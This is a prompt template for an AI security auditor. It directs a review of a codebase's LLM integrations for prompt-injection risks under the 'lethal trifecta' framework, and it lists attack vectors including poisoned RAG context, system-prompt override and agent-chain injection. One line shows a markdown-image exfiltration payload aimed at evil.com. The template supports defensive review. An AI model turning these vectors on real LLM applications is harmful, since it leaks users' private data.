version=1
# Prompt Injection and LLM Security Assessment

You are a security auditor specializing in LLM and prompt injection vulnerabilities. First, identify all LLM usage in this codebase, then analyze for security issues based on the "lethal trifecta" framework and other known attack vectors.

**IMPORTANT**: If this repository does not use LLMs, AI models, or any LLM-based infrastructure, simply respond with:
"No LLM usage detected - prompt injection review not relevant for this repository."

## Part 1: LLM Usage Detection and Documentation

### 1.1 LLM Infrastructure Identification

Scan the entire codebase and identify ALL usage of:

- **API-based LLMs:**
  - OpenAI (GPT-3.5, GPT-4, GPT-4 Turbo, GPT-5, text-davinci, etc.)
  - Anthropic (Claude, Claude 2, Claude 3, etc.)
  - Google (PaLM, Gemini, Bard API, etc.)
  - Mistral, Cohere, AI21, Replicate, etc.
  
- **Local/Self-hosted Models:**
  - HuggingFace Transformers
  - Ollama
  - llama.cpp
  - GGML/GGUF models
  - vLLM, TGI, or other inference servers
  
- **LLM Frameworks & Tools:**
  - LangChain, LlamaIndex
  - Semantic Kernel, Haystack
  - Model Context Protocol (MCP)
  - AutoGPT, BabyAGI, or other agent frameworks
  - Vector databases (Pinecone, Weaviate, Chroma, FAISS, etc.)
  
- **Prompt Engineering:**
  - Prompt templates or prompt management systems
  - Few-shot learning examples
  - Chain-of-thought prompting
  - System prompts or instruction templates

### 1.2 Detailed Usage Documentation

For EACH LLM usage found, document:

#### Usage #[N]: [Component/Feature Name]

**Type:** [API/Local/Framework]
**Technology:** [Specific LLM or framework]
**Location:**

- Files: `path/to/file1.ext`, `path/to/file2.ext`
- Key Classes/Functions: [list them]

**Purpose:** [What this LLM usage accomplishes]

**Configuration:**

- Model: [model name/version]
- Temperature: [if configured]
- Max tokens: [if configured]
- Other parameters: [list any]

**Data Flow:**

- **Input Sources:** [Where data comes from - user input, database, files, APIs, etc.]
- **Processing:** [How the LLM processes this data]
- **Output Destinations:** [Where results go - UI, database, files, external APIs, etc.]

**Access Controls:**

- Authentication required: [YES/NO]
- Authorization checks: [Describe any]
- Rate limiting: [YES/NO]

**Example Code:**

```[language]
// Show actual implementation snippet
```

---

### 1.3 LLM Usage Summary

**Total LLM Integrations Found:** [count]

**Primary Use Cases:**

1. [Main purpose 1]
2. [Main purpose 2]
3. [etc.]

**External Dependencies:**

- API Keys Required: [list which services]
- Models to Download: [list any local models]
- Additional Services: [vector DBs, etc.]

## Part 2: Security Vulnerability Assessment

Based on the LLM usage identified above, analyze for security vulnerabilities:

### 2.1 The Lethal Trifecta Analysis

For EACH LLM usage identified in Part 1, evaluate if it has all three dangerous components:

#### Component 1: Access to Private Data

**Check each LLM integration for:**

- Database access with sensitive data
- File system access to confidential documents
- API access to internal services
- Access to user PII or credentials
- Integration with private repositories

#### Component 2: Ability to Externally Communicate

**Check each LLM integration for:**

- HTTP/HTTPS request capabilities
- Email or messaging functionality
- File creation in publicly accessible locations
- API calls to external services
- Pull request/issue creation capabilities
- Webhook or callback mechanisms

#### Component 3: Exposure to Untrusted Content

**Check each LLM integration for:**

- Direct user input processing
- Reading from public sources (issues, PRs, comments)
- Processing external API responses
- Ingesting web content or scraped data
- Handling uploaded files or documents
- Processing data from third-party integrations

**Lethal Trifecta Assessment per Usage:**

| LLM Usage | Private Data | External Comm | Untrusted Input | Risk Level |
|-----------|--------------|---------------|-----------------|------------|
| Usage #1  | YES/NO       | YES/NO        | YES/NO          | CRITICAL/HIGH/MEDIUM/LOW |
| Usage #2  | YES/NO       | YES/NO        | YES/NO          | CRITICAL/HIGH/MEDIUM/LOW |

### 2.2 Specific Vulnerability Checks

For each LLM integration identified, check for these vulnerabilities:

#### 2.2.1 String Concatenation Issues

- **Location:** Check for direct string concatenation of user input with prompts
- **Pattern:** Look for patterns like `prompt = "Translate: " + user_input`
- **Risk:** Direct prompt injection through malicious user input

#### 2.2.2 Markdown Exfiltration Vectors

- **Location:** Check if the system renders Markdown from LLM outputs
- **Pattern:** Look for unfiltered Markdown rendering, especially images
- **Risk:** Data exfiltration via `![](https://evil.com?data=...)`

#### 2.2.3 Tool/Function Calling Security

- **Location:** Check LLM tool/function calling implementations
- **Pattern:** Look for unrestricted tool access or missing validation
- **Risk:** Malicious instructions triggering sensitive actions

#### 2.2.4 Insufficient Input Sanitization

- **Location:** Check all points where external data enters prompts
- **Pattern:** Missing or weak input validation/sanitization
- **Risk:** Injection of system prompt overrides

#### 2.2.5 System Prompt Protection

- **Location:** Check system prompt handling
- **Pattern:** Relying on "prompt begging" or weak instructions
- **Risk:** System prompt override attacks

#### 2.2.6 Output Validation

- **Location:** Check how LLM outputs are used
- **Pattern:** Direct execution or rendering without validation
- **Risk:** Code injection, XSS, or command execution

#### 2.2.7 MCP Security Issues

- **Location:** Check for Model Context Protocol usage
- **Pattern:** Multiple MCP servers with dangerous combinations
- **Risk:** Combining servers that create the lethal trifecta

#### 2.2.8 Retrieval Augmented Generation (RAG) Issues

- **Location:** Check vector database and retrieval systems
- **Pattern:** Untrusted documents in retrieval corpus
- **Risk:** Poisoned context injection

#### 2.2.9 Multi-Agent Security

- **Location:** Check agent-to-agent communication
- **Pattern:** Agents trusting outputs from other agents
- **Risk:** Cascading prompt injection through agent chains

#### 2.2.10 API Key and Secret Management

- **Location:** Check LLM API key storage and usage
- **Pattern:** Hardcoded keys, client-side exposure
- **Risk:** Unauthorized API usage and cost attacks

## Part 3: Vulnerability Report

### 3.1 Detailed Vulnerability Findings

For each vulnerability found, provide:

#### Issue #[N]: [Vulnerability Name]

**Severity:** CRITICAL | HIGH | MEDIUM | LOW
**Type:** [Prompt Injection | Data Exfiltration | Access Control | etc.]
**Affected LLM Usage:** [Reference Usage #N from Part 1]
**Location:**

- File: `path/to/file.ext`
- Line(s): [specific line numbers]
- Function/Class: [if applicable]

**Vulnerable Pattern:**

```[language]
// Show the actual vulnerable code
```

**Attack Scenario:**
[Describe how an attacker could exploit this]

**Example Attack:**

```text
[Show a concrete prompt injection or attack example]
```

**Mitigation:**
[Specific fix recommendation]

**Secure Implementation:**

```[language]
// Show the corrected code
```

---

### 3.2 Risk Assessment Summary

#### Overall Lethal Trifecta Status

- [ ] Access to Private Data: [YES/NO - explain]
- [ ] External Communication: [YES/NO - explain]
- [ ] Untrusted Input Exposure: [YES/NO - explain]
- **Overall Risk:** [CRITICAL if all 3, HIGH if 2, MEDIUM if 1]

#### Key Findings

1. **Most Critical Issue:** [Describe the highest risk vulnerability]
2. **Attack Surface:** [List main entry points for attacks]
3. **Data at Risk:** [What sensitive data could be exposed]

#### Required Mitigations

1. **Immediate:** [Critical fixes needed for vulnerabilities found]
2. **Short-term:** [Important fixes for issues identified]
3. **Long-term:** [Architectural changes needed for current problems]

#### Current Security Implementation Gaps

- Input validation issues found
- Output filtering problems identified
- Monitoring implementation weaknesses
- Rate limiting implementation issues

### 3.3 Additional Security Considerations

#### Security Control Implementation Status

Document which security controls are present or absent:
- [ ] Input validation layer [Present/Absent]
- [ ] Output sanitization [Present/Absent]
- [ ] Prompt injection detection [Present/Absent]
- [ ] Rate limiting [Present/Absent]
- [ ] Audit logging [Present/Absent]
- [ ] Domain allow-listing [Present/Absent]

#### Security Implementation Assessment

- [ ] Principle of least privilege for LLM tools [Implemented/Not Implemented]
- [ ] Separation of trusted/untrusted contexts [Implemented/Not Implemented]
- [ ] Secure prompt template management [Implemented/Not Implemented]
- [ ] Security testing [Implemented/Not Implemented]

**Note:** Focus on actual vulnerabilities present in the code with specific file locations and line numbers. Avoid theoretical risks without concrete evidence in the codebase.

---

## Repository Structure and Files

{repo_structure}
